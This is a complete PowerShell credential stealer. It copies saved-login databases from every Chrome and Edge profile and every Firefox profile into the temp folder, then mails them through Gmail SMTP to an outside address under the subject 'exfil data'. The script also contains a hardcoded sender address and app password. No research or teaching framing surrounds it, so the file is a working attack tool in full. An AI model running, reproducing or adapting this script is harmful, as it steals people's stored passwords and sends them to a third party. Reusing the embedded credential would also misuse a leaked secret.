# -- Copy Chrome Login Data from all profiles --
$chromeUserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$chromeLoginFiles = @()

if (Test-Path $chromeUserData) {
    $chromeProfiles = Get-ChildItem $chromeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
    foreach ($profile in $chromeProfiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $destFile = "$env:TEMP\chrome_login_data_$($profile.Name).db"
            Copy-Item $loginDataPath $destFile -ErrorAction SilentlyContinue -Force
            $chromeLoginFiles += $destFile
        }
    }
}

# -- Copy Edge Login Data from all profiles --
$edgeUserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
$edgeLoginFiles = @()

if (Test-Path $edgeUserData) {
    $edgeProfiles = Get-ChildItem $edgeUserData -Directory | Where-Object { $_.Name -match 'Default|Profile \d+' }
    foreach ($profile in $edgeProfiles) {
        $loginDataPath = Join-Path $profile.FullName "Login Data"
        if (Test-Path $loginDataPath) {
            $destFile = "$env:TEMP\edge_login_data_$($profile.Name).db"
            Copy-Item $loginDataPath $destFile -ErrorAction SilentlyContinue -Force
            $edgeLoginFiles += $destFile
        }
    }
}

# -- Copy Firefox logins.json from all profiles --
$firefoxProfileRoot = "$env:APPDATA\Mozilla\Firefox\Profiles"
$firefoxLoginFiles = @()

if (Test-Path $firefoxProfileRoot) {
    $firefoxProfiles = Get-ChildItem $firefoxProfileRoot -Directory
    foreach ($profile in $firefoxProfiles) {
        $loginsPath = Join-Path $profile.FullName "logins.json"
        if (Test-Path $loginsPath) {
            $destFile = "$env:TEMP\firefox_logins_$($profile.Name).json"
            Copy-Item $loginsPath $destFile -ErrorAction SilentlyContinue -Force
            $firefoxLoginFiles += $destFile
        }
    }
}

# -- Email setup --
$smtpServer = "smtp.gmail.com"
$smtpPort = 587
$from = "zubaidyomar@gmail.com"
$to = "temdawd2@gmail.com"
$subject = "exfil data"
$body = "just all the stuff"
$username = "zubaidyomar@gmail.com"
$password = "tgcwsfoamkossqej"

# Create credential object
$secpasswd = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ($username, $secpasswd)

# Collect all attachments
$attachments = @()
$attachments += $chromeLoginFiles
$attachments += $edgeLoginFiles
$attachments += $firefoxLoginFiles

# Filter out any null or non-existent files just in case
$attachments = $attachments | Where-Object { $_ -and (Test-Path $_) }

# Send email with attachments
Send-MailMessage -From $from -To $to -Subject $subject -Body $body -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $cred -Attachments $attachments
